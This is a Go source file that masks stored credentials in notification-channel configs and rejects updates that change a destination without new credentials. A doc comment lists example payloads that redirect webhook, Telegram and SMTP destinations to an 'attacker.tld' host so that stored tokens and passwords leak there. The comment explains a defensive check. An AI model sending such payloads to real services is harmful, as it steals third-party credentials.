package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix for masked values. When the API echoes back
// credentials it replaces the real content with a value carrying this prefix, and
// the update endpoint receiving such a value understands it as "keep the stored
// value unchanged".
//
// Using a prefix rather than an empty string or some fixed constant is so that a
// little identifying information can be carried along (see MaskedValue), letting
// the user tell "which robot this is" without having to re-paste the secret.
const MaskedPrefix = "__masked__"

// MaskedValue produces a masked value:
//
//	"__masked__"              the original value is too short, no hint given
//	"__masked__:…ab12cd"      with the last 6 characters of the original as a hint
//
// Exposing only the last 6 characters is deliberate: a webhook URL's identifying
// information is in its tail segment (e.g. the WeCom key, the Feishu robot id),
// while the prefix part is identical across robots and has no identifying value.
// The last 6 characters are not enough to reconstruct the credential, but enough
// for the configurer to recognize "that's my group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a masked value (i.e. was echoed by the API
// and not modified).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the config with the channel's credential fields
// replaced by masked values.
//
// An unknown channel type returns an empty map rather than the original config —
// better to make the UI show "config unavailable" than to dump the whole raw
// content, which may contain credentials, when the channel type is unrecognized.
// Non-credential fields are kept as-is so the UI can still display them.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Nested structures like headers are treated as a single credential as a
		// whole: judging each sub-key individually would require every channel to
		// declare another set of "which sub-keys are credentials" rules, far more
		// complexity than it's worth.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means "the destination address changed,
// but the caller did not take a position on the credential fields". It is returned
// rather than silently allowing the change or silently dropping credentials; see
// PrepareConfigUpdate for the reasoning.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // destination keys that changed
	Missing []string // credential keys with no explicit position taken
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "destination address (" + strings.Join(e.Changed, ", ") + ") has changed; please also re-enter the credential fields (" +
		strings.Join(e.Missing, ", ") + "): provide new values, or explicitly leave them empty to indicate the credentials are no longer needed. " +
		"The old credentials are only valid for the old address; continuing to use them amounts to handing them to the new address."
}

// PrepareConfigUpdate merges a channel config and handles the security-sensitive
// "destination address changed" case.
//
// It replaces the bare MergeConfig on the channel update path, and solves a
// path proven viable in practice: the destination address (where messages go) and
// the credentials (what identity they're sent with) are two independent sets of
// fields, and MergeConfig keeps the stored value for any key not mentioned. So
// anyone able to PATCH a channel can, simply by **changing only the address and
// staying silent about the credentials**, make the server send the stored real
// credentials to an endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → the original Authorization header goes out with the request
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<realToken>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → hands over username and password after STARTTLS
//
// This path is entirely silent, doesn't rely on redirects (so rejecting
// cross-host redirects doesn't stop it), and directly defeats this package's
// masking goal — "credentials are not echoed back to the browser".
//
// Rule: whenever any destination key is changed to a new value, the caller must
// take an explicit position on **every** credential key:
//   - give a new value → use the new value
//   - explicitly pass an empty string → the field no longer needs a credential
//     (preserving the clear semantics)
//   - echo the masked value unchanged / simply omit the key → reject
//
// The third is also rejected because a "masked value" means exactly "reuse the old
// credential", and the old credential is only valid for the old address. We
// deliberately do not "automatically drop credentials" here — for optional
// credential fields (webhook's headers, email's password) that would silently
// become "auth is gone but the API still returns 200", which is harder to debug
// than an error. Better to make the operator fill it in one more time.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("channel type %q is not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential value (e.g. webhook's headers is an object) has a
	// mask literal embedded in it, the caller stuffed the "keep the original value"
	// sentinel inside the structure. MergeConfig only recognizes "string with the
	// prefix" as a mask, so this form would be stored as-is as an ordinary object —
	// the literal "__masked__" would actually land in the database, and subsequent
	// auth would silently fail with no error. Better to reject.
	//
	// This check must come **first**: when the address is unchanged we take an
	// early return, so putting it later would only cover the "changed address"
	// path (the first version misplaced it exactly there, and a test caught it
	// immediately).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the destination keys that actually changed. A masked value equals "not changed".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// Address unchanged, do an ordinary merge (masked values keep the original,
		// empty strings clear, everything else overrides).
		return MergeConfig(stored, incoming), nil
	}

	// Address changed: require an explicit position on every credential key.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects submitting a mask sentinel embedded in a
// non-string structure.
//
// The masking mechanism assumes "the whole value is a string". An object field
// like webhook's headers can only be masked as a whole (written as the string
// "__masked__") or submitted as a whole; stuffing the sentinel inside the object
// can neither express "keep unchanged" nor avoid being stored as a real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("field %s contains the mask marker %q: this field may only be left entirely empty to keep the existing value, or submitted entirely as a new value; a mask placeholder must not be embedded inside the structure",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares two config values for equivalence. JSON serialization
// is used for the comparison so that type differences are handled along the way —
// the frontend submits a port as number, while the stored one reads back as
// float64, and a direct == would misjudge it.
//
// "Empty" must be normalized before comparing: an empty string and "key absent"
// are the same state in this config model, because MergeConfig treats an empty
// string as an explicit clear and deletes the key. Without normalization, an
// optional destination field that is always left empty (Telegram's base_url is
// the only such field: empty means use the official address) would take this path:
//
//	on create, base_url:"" is stored  →  first save, MergeConfig deletes the key
//	→ on second save incoming is "" and stored lacks the key, judged as "address changed"
//	→ the credential is a masked value → 400 "destination address has changed, please also re-enter the credential fields"
//
// After that every save fails unless the user re-pastes the Bot Token, even
// though they changed nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue determines whether a config value is "empty".
// The criterion must match MergeConfig's clear check (strings.TrimSpace(s) == ""),
// otherwise a gap appears where "MergeConfig thinks it should delete but
// sameConfigValue thinks it has a value".
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming on top of stored, for updating a channel config.
//
// Rules:
//   - keys in incoming whose value is masked → keep stored's original value (the user didn't change this field)
//   - keys in incoming whose value is an empty string → treated as an explicit clear, delete the key
//   - other keys → override with incoming's value
//   - keys present in stored but absent from incoming → keep (partial-update semantics)
//
// Whether an empty string counts as a "clear" needs to be explicit: the frontend
// form submits unfilled fields as empty strings, and treating that as a valid
// value would actually clear fields meant to be "left empty to keep the original".
// We choose explicit clear here, because when clearing a mis-set field the user
// has no other way to express it (dragging a field away can distinguish "not
// provided" from "provided empty", but the UI makes no use of that distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // masked value = unmodified, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
